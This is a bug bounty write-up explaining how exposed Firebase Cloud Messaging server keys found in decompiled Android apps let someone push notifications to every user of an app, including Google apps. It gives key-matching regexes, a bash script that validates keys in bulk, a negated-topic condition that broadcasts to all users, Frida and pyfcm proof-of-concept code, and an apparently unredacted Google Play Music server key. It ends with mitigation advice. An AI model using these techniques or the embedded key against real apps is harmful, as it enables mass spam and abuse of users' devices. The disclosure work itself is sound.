---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-08-17_firebase-cloud-messaging-service-takeover-a-small-research-that-led-to-30k-in-bo.md
original_filename: 2020-08-17_firebase-cloud-messaging-service-takeover-a-small-research-that-led-to-30k-in-bo.md
title: 'Firebase Cloud Messaging Service Takeover: A small research that led to 30k$+
  in bounties'
category: documents
detected_topics:
- oauth
- otp
- api-security
- mobile-security
- access-control
- command-injection
tags:
- imported
- documents
- oauth
- otp
- api-security
- mobile-security
- access-control
- command-injection
language: en
raw_sha256: fea40c5875e31127083ac8ceb504d9d419971f52c85c82372609d68bf9e4c0cb
text_sha256: af205d6dd48d417d998d89ca3b7aaf8a4640d7be8f62b6420a2fa5bd3fa0719d
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: true
---

# Firebase Cloud Messaging Service Takeover: A small research that led to 30k$+ in bounties

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-08-17_firebase-cloud-messaging-service-takeover-a-small-research-that-led-to-30k-in-bo.md
- Source Type: markdown
- Detected Topics: oauth, otp, api-security, mobile-security, access-control, command-injection
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: True
- Raw SHA256: `fea40c5875e31127083ac8ceb504d9d419971f52c85c82372609d68bf9e4c0cb`
- Text SHA256: `af205d6dd48d417d998d89ca3b7aaf8a4640d7be8f62b6420a2fa5bd3fa0719d`


## Content

---
title: "Firebase Cloud Messaging Service Takeover: A small research that led to 30k$+ in bounties"
page_title: "Firebase Cloud Messaging Service Takeover: A small research that led to 30k$+ in bounties - Abss"
url: "https://abss.me/posts/fcm-takeover/"
final_url: "https://abss.me/posts/fcm-takeover"
authors: ["Abss (@absshax)"]
programs: ["Google"]
bugs: ["Hardcoded API keys", "Information disclosure"]
bounty: "30,000"
publication_date: "2020-08-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4312
---

# [Abss](/)

## My write-up’s, Discoveries & Open Source Contributions

[__](https://github.com/abss0x7tbh "Github")[__](https://twitter.com/absshax "Twitter")

  * [Home](/)
  * [Blog](../posts)
  * [Open-Source](../open-source)
  * [Press Appearances](../press-appearances)

# Firebase Cloud Messaging Service Takeover: A small research that led to 30k$+ in bounties

Posted on — Aug 17, 2020

* * *

## TL;DR

A malicous attacker could control the content of push notifications to any application that runs the FCM SDK and has it’s FCM server key exposed & at the same time send these notifications to every single user of the vulnerable application!

These notifications could contain anything the attacker wants including graphic/disturbing images(via the `"image": "url-to-image"` attribute) accompanied with any demeaning or politically inclined message in the notification!

![intigriti fvcm tip](../intigriti-tip.png)

_courtesy:[Intigriti](https://twitter.com/intigriti/status/1301856311211184129?s=20)_

* * *

The beginning of this year has seen a lot of [#AndroidHackingMonth](https://twitter.com/search?q=%23androidhackingmonth&src=typed_query) tweets popup which led to some pretty good disclosures showing different techniques and tricks with respect to android application hacking. I was intrigued and decided to fiddle a little with android hacking.

## Table Of Content

  * [Gathering a dataset of Decompiled APKs](../posts/fcm-takeover#gathering-a-dataset-of-decompiled-apks)
  * [Variable names have it all](../posts/fcm-takeover#variable-names-have-it-all)
  * [The FCM Server Key - Reading docs and validation of the key](../posts/fcm-takeover#the-fcm-server-key---reading-docs-and-validation-of-the-key)
  * [Discovering Key Variations](../posts/fcm-takeover#discovering-key-variations)
  * [Defining Impact](../posts/fcm-takeover#defining-impact)
  * [Logical Conditional Expressions - Broadcasting using the NOT expression](../posts/fcm-takeover#logical-conditional-expressions---broadcasting-using-the-not-expression)
  * [Collaboration and POC in progress](../posts/fcm-takeover#collaboration-and-poc-in-progress)
  * [GoogleVRP writeup - Getting hooked to Frida for a clear POC to affect a billion users](../posts/fcm-takeover#googlevrp-writeup---getting-hooked-to-frida-for-a-clear-poc-to-affect-a-billion-users)
  * [Taking over FCM services of Google Play Music to affect a billion users](../posts/fcm-takeover#taking-over-fcm-services-of-google-play-music-to-affect-a-billion-users)
  * [Taking over FCM services of Google Hangouts, Youtube Go and Youtube Music to affect a billion users](../posts/fcm-takeover#taking-over-fcm-services-of-google-hangouts-youtube-go-and-youtube-music-to-affect-a-billion-users)
  * [Notes On Mitigation](../posts/fcm-takeover#notes-on-mitigation)

## Gathering a dataset of Decompiled APKs

After rammaging through a dozen blogs on how to begin with hacking android applications and reading them to the best of my abilities, I decided to initially start with looking for secrets in an android application.

This meant decompiling an android apk and just grepping for some know patterns within the `strings.xml` file as that’s usually where secrets can be found and also the decompiled `.smali` files for “secret declaration” within the code i.e mediocre static code analysis. Sounds like a good first step!

I started downloading apks of some public and private programs from [Hackerone](https://hackerone.com/) and [Bugcrowd](https://bugcrowd.com/) so as to collect an initial dataset and then go in looking for secrets all together.

I was able to achieve this by the help of [h1passets](https://github.com/defparam/h1passets). I also sent in a mediocre [PR](https://github.com/defparam/h1passets/pull/2) to collect all the package ids of the apks of Hackerone’s private programs. I then scraped a few package ids of public programs of HackerOne and Bugcrowd from [bounty-targets-data](https://github.com/arkadiyt/bounty-targets-data).

Once the package ids were collected, I took some time out to download them from [apkcombo](https://apkcombo.com/). After having close to 50-70 apks downloaded into a single folder, I began mass decompiling these apks using [apktool.jar](https://bitbucket.org/iBotPeaches/apktool/downloads/).

I did this with a simple bash script shown below
  
  
  #!/bin/bash
  
  for file in *.apk
  do
  java -jar ~/APK_Research/apktool.jar d $file -o decompiled_apks/$file/
  done
  

So now I had a credible sized dataset of decompiled apks to work with!

* * *

## Variable names have it all

After hooking up [gf](https://github.com/tomnomnom/gf) (A wrapper around grep) with a modified version of regex patterns from [Zile](https://github.com/xyele/zile) (i remeber this was named something else initially), I began a simple gf grep through the decompiled apks directory to see if I could spot some secrets right away and report them.

I used my vps to run overnight gf greps from the Decompiled_apks folder and saved those results in separate files for further analysis. These saved files contain the API key/secret, their location and also their variable name.

Come the next day, I looked up most of the files and found pretty much nothing, just a bunch of SDK keys which were meant to be public, API keys with limited scope etc.

It was time to look into the `gcp_keys.txt` that contained the google cloud project (GCP) API keys. I knew they would usually contain API keys for Google Maps Or Google Crash Reporting API which had no impact.

But it was common knowledge that GCP keys could be multi-privileged i.e the same key could be utilized for different enabled API’s!

So I began looking into the `gcp_keys.txt` file but with more focus on the variable names. Variable names can sometimes provide a lot of information about the privilege of the key. Here’s a rough snippet of the variable names I encountered inside the `gcp_keys.txt`:
  
  
  apk-1/AndroidManifest.xml: <meta-data android:name="server_key" android:value="AIzaSyB[REDACTED]"/>
  apk-3/trx.smali:  const-string v1, "AIzaSyQ[REDACTED]"
  apk-5/AndroidManifest.xml: <meta-data android:name="com.google.android.geo.API_KEY" android:value="AIzaSy[REDACTED]"/>
  apk-8/res/values/strings.xml: <string name="google_maps_geocoder_key">AIzaSyl[REDACTED]</string>
  apk-2/res/values/strings.xml: <string name="notification_server_key">AIzaSyl[REDACTED]</string>
  apk-4/AndroidManifest.xml: <meta-data android:name="com.google.android.maps.v2.API_KEY" android:value="AIzaSy[REDACTED]"/>
  

So from the file, I was able to extract the below list of _as I call it_ potential variable names.

google_maps_geocoder_key, notification_server_key, google_notification_key, app_api_key, googlePlacesWebApi, server_key … etc

I felt these keys were capable of something more! I started looking for articles/blogs containing similar variable names in order to conclude what exactly the key does.

Both `server_key` and `notification_server_key` led me to [Firebase Cloud Messaging / FCM](https://firebase.google.com/docs/cloud-messaging/server)

* * *

## The FCM Server Key - Reading docs and validation of the key

After visiting [Firebase Cloud Messaging / FCM](https://firebase.google.com/docs/cloud-messaging/server) ,i understood that the keys grepped could somehow be linked to cloud messaging aka push notification services. I was yet to find an article that explained everything, so I started digging again.

From the docs I got a gyst of a few things.

  * There’s a server environment which deals with **Send Requests** i.e authorized requests that enforce push notifications
  * There’s a client FCM SDK that takes care of generating IID tokens that identifies an app instance on a device uniquely.

Possibilities with the keys at hand? I either could have a key that has some role in the server environment or a client-end SDK key which was already meant to be public.

I focused on the server environment and came across the [Legacy to HTTP v1 server protocol migration guide](https://firebase.google.com/docs/cloud-messaging/migrate-v1) . This article recommended migrating from a [Legacy HTTP protocol](https://firebase.google.com/docs/cloud-messaging/http-server-ref) to the modern HTTP v1.

But as you see, It also shows how the `AizaSy` keys can be used as authorization keys under the [before section](https://firebase.google.com/docs/cloud-messaging/migrate-v1#update-authorization-of-send-requests), the same is shown in the image below

![FCM Authorization done via AizasY](../aizasy.png)

From this, I figured the `AizaSy` keys are used for authorization of **Send Requests** via the Legacy HTTP protocol. This meant sending push notifications of my choice via the legacy HTTP protocol.

We cannot use the modern HTTP v1 protocol as it is based on the oauth2.0 security model. This makes use of bearer tokens of service accounts.

So reading the docs [here](https://firebase.google.com/docs/cloud-messaging/auth-server#authorize-http-requests) under the legacy http protocol, I found a simple `curl` to validate the key.
  
  
  api_key=***REDACTED***
  curl --header "Authorization: key=$api_key" \
  --header Content-Type:"application/json" \
  https://fcm.googleapis.com/fcm/send \
  -d "{\"registration_ids\":[\"ABC\"]}"
  

If the above curl returns a `200 OK` response status code then the key is legit. Anything other than `200 OK` and the key is invalid. Testing this on one of the suspected keys showed a `200 OK` response status code!

I knew how to validate the key and also the purpose of the key.

To sum things up, here is an overview of the FCM Architecture

![FCM Architecture](../fcm-workings.png)

* * *

## Discovering Key Variations

As I was reading the forementioned [article](https://firebase.google.com/docs/cloud-messaging/auth-server#authorize-http-requests) on authorizing legacy HTTP requests, I followed the first instruction that said to visit the [Cloud Messaging tab](https://console.firebase.google.com/project/_/settings/cloudmessaging/) of the firebase project in order to locate the FCM server key `AizaSy` and there I found another variation of the key!

The image below shows both variations of a FCM server key.

![FCM Keys](../fcm_keys.png)

The FCM server key of regEx `AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}` is similar to the Legacy Server key i.e both are project credentials having authority over sending authorized send requests to all FCM SDK enabled applications under the firebase project. This key type is recommended to be used as per the docs.

Later on, my search for various blogs regarding the GCM( Google Cloud Messaging ) to FCM migration I noticed there is also the possibility of a gcp key to exist with formerly gcm permissions as seen [here](https://www.izooto.com/blog/generate-gcm-sender-id-server-api-key).

GCM has been long deprecated but due to migration and to stop any regressions, such keys were still valid for the new FCM endpoints! This is the final variation of the FCM server key.

So we have 3 types of FCM server keys :

  * A FCM server key of regEx `AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}`
  * A Legacy FCM server Key of regEx `AIzaSy[0-9A-Za-z_-]{33}`. This gets automatically added to your GCP project.
  * A GCP key with FCM privileges of the same regEx as above `AIzaSy[0-9A-Za-z_-]{33}`. In This variation, the key is createdunder a GCP project and then provided the essential privileges.

As of now the Legacy Server Key has been deprectaed, so any forthcoming firebase project will not contain Legacy Server Keys anymore :

![Deprecated Legacy Server Key](../deprecated_legacy_server-key.png)

But if found, they are still valid! (again to prevent any backlogs and regressions!)

I quickly added the new regEx `AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}` to my gf profile and began another round of grep through the decompiled apk dataset and validated them!

Below is the combined gf profile for all key variations
  
  
  {
  "flags": "-oEarHn",
  "patterns": [
  "AIzaSy[0-9A-Za-z_-]{33}",
  "AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}"
  ]
  }
  

More hits followed!

After grepping for the keys, I wrote a simple validation script that places all conforming FCM keys into a single txt file
  
  
  #!/bin/bash
  while read -r key
  do
  code=`curl --header "Authorization: key=$key" --header Content-Type:"application/json" -s -o /dev/null -w "%{http_code}" -d "{\"registration_ids\":[\"ABC\"]}" 'https://fcm.googleapis.com/fcm/send'`
  if [ "$code" == "200" ]
  then
  echo "[*]  Key is $key"
  echo "$key" >> valid_keys.txt
  fi
  #gcp_keys.txt has the all the grepped keys, both AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140} and AIzaSy[0-9A-Za-z_-]{33}
  done<"/gcp_keys.txt"
  #eliminate duplicates
  sort -u -o valid_keys.txt valid_keys.txt
  echo "DONE!"
  

To my surprise, my initial dataset of 50 decompiled apks gathered A LOT of validated keys of both regeEx’s belonging to various bug bounty programs!

* * *

## Defining Impact

At this point in time, I had all the validated keys and I knew what the keys are used for. But I had a lot of questions to answer.

  * How do I define the impact here?
  * What are the steps required to create a clear cut POC?
  * Can I make use of rich notifications i.e images/gifs etc?

I knew the “What” of the impact i.e affecting many users with malicious push notifications and crippling business rep, but not the “How”.

So thinking in terms of impact, “broadcast” comes to mind. I mean, more the users affected higher the impact.

Time to dig again.

I came across this article about [topic messaging](https://firebase.google.com/docs/cloud-messaging/android/topic-messaging) that explains how FCM allows the use of “topics” to group users/device tokens and send notifications to multiple devices at once. I felt this fit the bill perfectly.

Topics are server side attributes that define a collection. For example, an application could define a topic called “news” and group users interested in the news category so as to send them similar notifications at once instead of sending notifications to every individual separately.

A visual representation of topic messaging is shown here

![Topic Messaging Explanation](../topic_messaging_explanation.png)

_credits:<https://docs.microsoft.com/en-us/xamarin/android/data-cloud/google-messaging/firebase-cloud-messaging>_

But this approach comes with some strings attached. Either the application aka the [client side](https://firebase.google.com/docs/cloud-messaging/android/topic-messaging#subscribe_the_client_app_to_a_topic) needs to subscribe users to a topic or the FCM Admin SDK aka the [server environment](https://firebase.google.com/docs/cloud-messaging/android/topic-messaging#manage_topic_subscriptions_on_the_server) had to.

So to fetch the `topic name`, I had 2 ideas in mind.

  * Idea #1: Client Side Grep for

  
  
  subscribeToTopic(
  

within the application code.

This function accepts the topic name as the argument so the actual prototype of the function is `subscribeToTopic("weather")`

This gave me no results. So it could mean that the topics could have been managed on the server environment, so I go with idea #2

  * Idea #2: Server Side Bruteforce topic names

So assuming that a user is subscribed to a topic, I had to bruteforce multiple topic names and then use the POST request below per topic name to reach every user:
  
  
  POST https://fcm.googleapis.com/fcm/send HTTP/1.1
  Content-Type: application/json
  Authorization: Key=AizaSy
  {
  "message":{
  "topic" : "<TOPIC-NAME>",
  "notification" : {
  "body" : "This is a Firebase Cloud Messaging Topic Message!",
  "title" : "FCM Message"
  }
  }
  }
  

A very unlikely scenario. A topic name could be anything that the regEx `[a-zA-Z0-9-_.~%]+` allows. That’s a lot of topic names with a lot of combinations.

This led to a lot more digging which led me to the use of “conditions” in FCM.

_Note: It isn’t mandatory to have a user subscribed to a topic for them to be notified. Neither client-end nor server-end topic management is required. Thanks to my buddy[Yash Sodha](https://twitter.com/y_sodha) who proved this by creating a test app and experimenting with it. This just proves that the IID token generated by the FCM client SDK is registered at the FCM backend irrespective of topic subscription._

Here’s what happens behind the scenes when a client app registers with the FCM backend

![FCM registration](../fcm_registration.png) _credits:<https://docs.microsoft.com/en-us/xamarin/android/data-cloud/google-messaging/firebase-cloud-messaging>_

* * *

## Logical Conditional Expressions - Broadcasting using the NOT expression

The below paragraph is referenced from : <https://firebase.google.com/docs/cloud-messaging/android/topic-messaging#build_send_requests>

![conditions](../conditions.png)

Logical Expressions!

This means, “Logical Conditional Expressions” can be used which in turn means I can make use of “&&"(logical and), “||”(logical or) and “!"(logical not) to formulate a condition that forces the FCM backend to make a dynamic decision to choose the user.

So why not leverage this to choose every user by setting a condition that always holds true!

For example above, Condition and its translation :

* * *

`Condition: `

`"'TopicA' in topics && ('TopicB' in topics || 'TopicC' in topics)"`

* * *

`Translation: `

`For a user X,`

`check if they are subscribed to topic A **and** topic B **OR** topic C. `

`If yes, enroll them to recieve the notification`

* * *

_Note how we need to know the topic name to formulate the condition above._

So using a NOT (!) condition with a random topic name would be true irrespective of the user’s topic subscription and would enroll them for the notification:

_You can use any random topic name with any sorts of randomization . I have used`xyz4356545` in the below example to forumulate this condition_.

For Example,

* * *

`Condition:`

`"!('xyz4356545' in topics)"`

* * *

`Translation:`

`For a User X,`

`Check If 'xyz4356545' exists under their topics subscription?`

`Always NO, so the condition ('xyz4356545' in topics) is always False.`

`Using "!", ` `('xyz4356545' in topics) --> !('xyz4356545' in topics)`

`Will always negate False, i.e always True for every user.`

* * *

The above condition will always hold true for every user until we find a user who actually has ‘xyz4356545’ under their `topics` only then would result in the condition returning False for the user. This is extremely unlikely given the randomization which is again left to our choice.

Given the topic name regEx `[a-zA-Z0-9-_.~%]+`, we could come up with a completely random string with almost no collision ensuring our condition always holds True!

So the FCM backend would iterate the given condition for every user and would in short enroll every user of the application to recieve the notifications.

Stoked With the possibility of now broadcasting a malicious push notification from the attacker to the entire application userbase, I started reporting to various bug bounty programs and in parallel also started working on ways of creating a suitable POC that could be externally produced to share with the teams.

This was vital as always relying on the program triage team wasn’t the best way to go about it.

* * *

## Collaboration and POC in progress

I shared the vulnerability details with [streaak](https://twitter.com/streaak) and [martinbydefault](https://martinbydefault/). They helped me widen my reach into looking for more vulnerable keys and collaborated with me.

Streaak also helped me download apks of different bug bounty programs by sharing the workload. Only later was the much needed script [apk-downloader.py](https://github.com/gwen001/pentest-tools/blob/master/apk-downloader.py) released. Kudos to [Gwendal Le Coguic](https://twitter.com/gwendallecoguic) for this!

We were able to find a few more keys.

The reports until this point of time had the validated key and the ideal impact.

The program triage teams always obliged to take care of the POC on their end so there was never really any hush. After triage, I usually would receive a reply similar to “thanks for reporting this validated key, we confirm it belongs to our mainstream application project and we would ask you to stop testing.”

Though I did have a little bit of POC related questions from platform triagers of HackerOne and Bugcrowd which was expected and understandable. The program triage team would take over and confirm the POC on their own and pay out.

An example of such an interaction below with the amazing Deliveroo Team. They were super quick in fixing the bug and paying out the very next instant!

![Quick triage](../quick_fix.png)

![Quick Bounty](../deliveroo_bounty.png)

Here’s the steps the team took to produce the POC internally

![POC](../internal_poc.png)

As you can see above, sending a push notification to my device would make for an ideal POC.

To do so, I needed to find a way to fetch my IID token generated by the FCM SDK in the client app.

I came across this [article](https://developers.google.com/instance-id/reference/server#get_information_about_app_instances) that explains :

  * How to fetch the server instance metadata via the IID token from the client. I could use this to confirm the relationship between the FCM Key and the applcation to prove that the key indeed has authority over the said application.

![server instance metadata](../pid.png)

The response after a successful request would look somethig like this :
  
  
  {"applicationVersion":"57018","application":"com.org.app","scope":"*","authorizedEntity":"838826245449","appSigner":"1c70bd0334ba2d71bdff6e501b30db0328bc5c14","platform":"ANDROID"}
  

where `com.org.app` is the package id of the client application. Bingo, this clearly maps the key to the target application!

  * How to send a notification to my own device and create the POC

I could do so using the below CURL
  
  
  api_key=***REDACTED***
  curl --header "Authorization: key=$api_key" \
  --header Content-Type:"application/json" \
  https://fcm.googleapis.com/fcm/send \
  -d "{\"registration_ids\":[\"IID TOKEN A.K.A Registration token goes here\"]}"
  

After replacing the value of `registration_ids` with my IID token from the client app, I would then be able to send the notification to my own device and make a POC

* * *

## GoogleVRP writeup - Getting hooked to Frida for a clear POC to affect a billion users

I never planned on checking Google applications for a hack via their own services. I just assumed the chances would be nil and left them for the end. (Never do this)

A few ideas came to mind as I was attempting to fetch my IID token to complete the POC.

My first idea was to attempt `.smali` code edit, place a `Log()` statement within the `onCreate()` function to log the FCM IID token that was generated.(As there are no imports in `smali`. Everything is absolute)

I placed the below within the `onCreate()`:
  
  
  const-string v1, "FCM Device Token" invoke-static {v1, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I move-result v1
  

The above is a simple Log statement. I wanted to check if I could make things work this way, starting simply by Logging the string “FCM Device Token”. I wasn’t able to get the Log() statement to work even after multiple attemps and also after successfully repackaging the apk.

So I knew there was a lot more to learn with respect to smali editing and registers.

As I was going about it, [Yash Sodha](https://twitter.com/y_sodha) with whom I had already shared the vulnerability and agreed to collaborate with, came to me with a vulnerable key in Google Hangouts!

We were stoked!

We decided to download all the google applications and test them for the same. After decompiling and running some scripts, we found A LOT of such keys exposed in the client applications.

As we both were trying to create the POC, Yash suggested I look into [Frida](https://frida.re/), a dynamic application analysis tool that would let me make changes on the fly in order to try creating the POC. I was a complete beginner at anything that had to do with mobile application hacking, so frida was super new to me.

It was high time to leave smali editing as the process was unfruitful. It was time to learn Frida. Though later on, I did learn a lot of basics about smali editing thanks to this excellent [blogpost](https://yasoob.me/posts/reverse-engineering-android-apps-apktool/) by [Yasoob Khalid](https://twitter.com/yasoobkhalid)!

I used the below resources in order to learn a good bit about Frida:

  * <https://frida.re/docs/examples/android/>
  * <https://www.shielder.it/blog/fridalab-writeup/>
  * <https://joshspicer.com/android-frida-1>
  * <https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/frida-tutorial>
  * <https://resources.infosecinstitute.com/frida/#gref>

### Taking over FCM services of Google Play Music to affect a billion users

We found the FCM server key of the longer regEx exposed within the decompiled `.smali` code of Google Play Music:
  
  
  ./smali_classes2/com/google/android/music/firebase/FirebaseAppFactory.smali:35:
  const-string v1, "AAAAODDc_Do:APA91bG5kQSzauxg1GSrq3eot5GUPyfouZ5KZObtBUpdM0xoxWGCulSPK1FIKan3IIBK-YlrkOcXkIo0kv7NlUFSOV54Qdy21z9czkFBoe6dMxBEEKAAD8KlC3LYuDugRdrMXJr1ggsL"
  

After familizarizing myself with Frida, I developed a little methodoloy that narrows down the functions I needed to trace:

  * Decompile the apk and view source code via [JADX GUI](https://github.com/skylot/jadx)

  * Search for classes with FCM instance id import “import com.google.firebase.iid.FirebaseInstanceId;”. These classes would contain functions that would call the required SDK methods that return the IID token. So this would narrow down such classes for me.

  * Find a suitable function that fiddles with the IID token and probe into it.

I did the same with Google Play music.

After decompiling and searching for “import com.google.firebase.iid.FirebaseInstanceId;”, I came across the class “com.google.android.music.sync.google.gcm.FcmRegistrationHandler”

![GPM - search for class](../search_import.png)

The forementioned class had the function `getFcmIidToken()` . Here is it’s definition:
  
  
  private String getFcmIidToken() throws FcmRegistrationException {
  Task<InstanceIdResult> instanceId = this.firebaseInstanceId.getInstanceId();
  try {
  Tasks.await(instanceId);
  if (!instanceId.isComplete() || !instanceId.isSuccessful()) {
  throw new FcmRegistrationException("Cannot get iid.");
  }
  InstanceIdResult result = instanceId.getResult();
  if (instanceId.isSuccessful()) {
  Log.d("MusicGcmRegistration", "FCM registration was successful.");
  return result.getToken();
  }
  throw new FcmRegistrationException("Not saving FCM token, does not exist.", instanceId.getException());
  } catch (InterruptedException | ExecutionException e) {
  throw new FcmRegistrationException("Error getting iid", e);
  }
  }
  

As you notice, we have the `return result.getToken();` that returns the FCM IID token on successful instance registration i.e if `instanceId.isSuccessful()` is True.

`result.getToken()` can be expaned to : `this.firebaseInstanceId.getInstanceId().getResult().getToken()`

I wrote a simple Frida script to fetch the return value of `getFcmIidToken()` function and capture the return.

getFCM.js
  
  
  Java.perform(function () {
  console.log("Tracing getFcmIidToken under class com.google.android.music.sync.google.gcm.FcmRegistrationHandler");
  // As the method getFcmIidToken() is non-static, it needs to be invoked by an instance of the class.
  // Hence the use of Java.choose()
  Java.choose("com.google.android.music.sync.google.gcm.FcmRegistrationHandler", {
  onMatch: function (inst) {
  console.log("Instance Found "+inst.toString());
  var ret_val = inst.getFcmIidToken();
  console.log("FCM IID token is "+ret_val);
  }
  });
  console.log("Done");
  });
  

We run using Frida CLI as :
  
  
  frida -U -l C:\Users\user\Desktop\getFCM.js -f com.google.android.music --no-pause
  

We get the IID token as shown below!

![Frida CLI Output](../fcm_frida_final_op.png)

We finally have what we need!

For the POC, we

  * Fetch Server Instance Metadata via the below curl

  
  
  curl -X GET  --header "Authorization: key=AAAAODDc_Do:APA91bG5kQSzauxg1GSrq3eot5GUPyfouZ5KZObtBUpdM0xoxWGCulSPK1FIKan3IIBK-YlrkOcXkIo0kv7NlUFSOV54Qdy21z9czkFBoe6dMxBEEKAAD8KlC3LYuDugRdrMXJr1ggsL" --header "Content-Type:application/json" https://iid.googleapis.com/iid/info/fgis_9yyD_c:APA91bEilQI1ncoYlYpF-AIUQvQdymi7iSaXDX2Tuv3rhpo3PDoawCHhzmdFjahXsltRuYxPb7vL2YReVOR4fCMcir76rFsKLfer4abpq8_KdRzGHf1exz0GJU4APTOadqvU5x9vv1os?details=true
  

Response:
  
  
  {"applicationVersion":"84291","application":"com.google.android.music","scope":"*","authorizedEntity":"241337957434","appSigner":"38918a453d07199354f8b19af05ec6562ced5788","platform":"ANDROID"}
  

_Note: The authorizedEntity attribute is unique per firebase project_

voila! The key has authority over the Google Play Music App!

Now for the final POC, I made use of pyfcm and wrote a simple python script
  
  
  $ python3 fcm_send_selfnotif.py -sk <server_key_found> -iid <iid_token_extracted>
  
  
  
  from pyfcm import FCMNotification
  import argparse
  # Input Management
  ap = argparse.ArgumentParser()
  ap.add_argument(
  "-sk", "--serverkey", required=True,
  help="FCM Server Key found"
  )
  ap.add_argument(
  "-iid", "--iid", required=True,
  help="IID Token source from the Client App"
  )
  args = vars(ap.parse_args())
  server_key = args["serverkey"]
  iid = args["iid"]
  #Authorization
  push_service = FCMNotification(api_key=***REDACTED***
  #Notification Payload
  registration_id = iid
  message_title = "FCM Hack!"
  message_body = "By Abhishek Dharani and Yash Sodha"
  #Building Send Request and Executing it.
  result = push_service.notify_single_device(registration_id=registration_id, message_title=message_title, message_body=message_body,dry_run=False)
  print result
  

POC _Google Play Music_!

![GPM POC](../gpm_poc.jpg)

### Taking over FCM services of Google Hangouts Youtube Go and Youtube Music to affect a billion users

After some observation, we discovered that the IID tokens were usually stored via the `getDefaultSharedPreferences()` method. It made sense as they’re expected to be pretty long lived as commented [here](https://github.com/firebase/quickstart-js/issues/101#issuecomment-280087601) unless they are invalidated abruptly upon which `onTokenRefresh()` is called.

The below image shows how most of these IID tokens were found

![Shared Prefs](../sprfs.jpg)

So with the IID tokens and the keys, we were able to create instant POC’s!

Here are the POC’s

![All POC](../collage_poc_2.jpg) _From Left: Google Hangouts, Youtube Music, Youtube Go_

It was fun working with the Google Security team to fix these. We also recieved the covid-19 google research grant in addition to some good bounties!

![gvrp research grant](../google_research_grant.png)

My GoogleVRP Hunter Profile: <https://bughunter.withgoogle.com/profile/90e81371-025b-46c8-b913-c95e4e9e65bc> ( woot! Top 100 (#93) at the time of writing this! )

* * *

## Notes On Mitigation

Always include FCM server keys within your app server logic and never in any client-end code. Also do not share these keys publicly on Github, Gitlab, pastebin and other similar online sources.

  * If the server key exposed is a FCM Legacy Server key of the pattern `AIzaSy{33}` under the [cloud messaging tab](https://console.firebase.google.com/u/0/project/app-name/settings/cloudmessaging/) then these keys are constants within the console i.e no edit/delete options are available.

From the info i could gather, these keys can be re-generated or deleted in another way as show in the explanation below.

There is a way for you to delete the currently tied Legacy Server Key in your Firebase Project, however, I would like to point out that this might cause issues if not handled properly. Only do this if you are absolutely sure that you won’t be using the Legacy Server Key ever again.

Here are the steps:

  * Go to your [Google Developers Console Page](https://console.developers.google.com/).
  * After sign in, select the correct project on the upper right side. If you can’t find it in Recent, go to the All tab.
  * After selecting the correct project, click on Credentials on the panel to the left. You should then see a list of keys, one of which is named Server key (auto created by Google Service). If you check, this is the same Legacy Server Key visible in your Firebase Project.
  * From here, you can click on the Pencil or Trash icon.

If you click on the pencil icon, it will direct you to a page where you can choose to Re-Generate or Delete the key. Choosing to generate a new key would give you a new server key, where the change would also reflect in your Firebase Project, while also still having the option to revert to it (only within the 24 hours limit).

Choosing to delete the key would automatically generate a new one for you, but you won’t be able to have the option to revert to it.

You can then implement a server side solution for this.

Source : answer on [stackoverflow](https://stackoverflow.com/questions/50086326/disable-legacy-server-key)

  * If you have the long 152 character FCM server key with pattern such as the regex here:

`AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140}`

You will have to delete the server key from your firebase console [cloud messaging tab](https://console.firebase.google.com/u/0/project/app-name/settings/cloudmessaging/) as i don’t think restriction is possible here. You can produce a new one & implement a server-side solution.

In short, follow the instructions from the official documentation [here](https://firebase.google.com/docs/cloud-messaging/concept-options)

![mitigation](../mitigation.png)

* * *

This was one heck of a roller coaster and I thoroughly enjoyed deep diving into this!

If you enjoyed reading, feel free to follow [me](https://twitter.com/absshax) for much more similar content! I’m currently on a writers high and I hope to push out a few more interesting cases.

adiós!

Share on: 

Abss© Copyright notice | [Ezhil theme](https://github.com/vividvilla/ezhil) | Built with [Hugo](https://gohugo.io/)
